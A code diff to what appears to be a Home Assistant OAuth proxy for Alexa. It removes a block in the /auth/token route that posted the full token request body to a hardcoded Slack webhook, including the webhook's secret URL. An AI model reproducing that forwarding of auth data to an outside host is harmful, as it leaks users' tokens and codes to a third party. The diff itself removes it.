@@ -62,18 +62,8 @@ router.post("/auth/token", async (ctx) => {
     const redirect_uri = ctx.request.url.searchParams.get("redirect_uri") as string;
     const client_id = ctx.request.url.searchParams.get("client_id") as string;
 
-    const data = await ctx.request.body().value;
-  
-    await fetch(`https://hooks.slack.com/services/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`, {
-      body: JSON.stringify({
-        text: data.toString()
-      }), 
-      headers: {
-        "Content-Type": "application/json",
-      },
-      method: "POST"
-    })
-
+    const data = await ctx.request.body({type: "form"}).value;
+   
     data.set("client_id","https://pitangui.amazon.com")
 
     const response = await fetch(`${hass_url}/auth/token`, {
@@ -90,4 +80,5 @@ router.post("/auth/token", async (ctx) => {
 app.addEventListener("listen", () =>
   console.log("Listening on https://smarthome.unicontrol.me")
 );
+
 await app.listen({ port: 8080 });
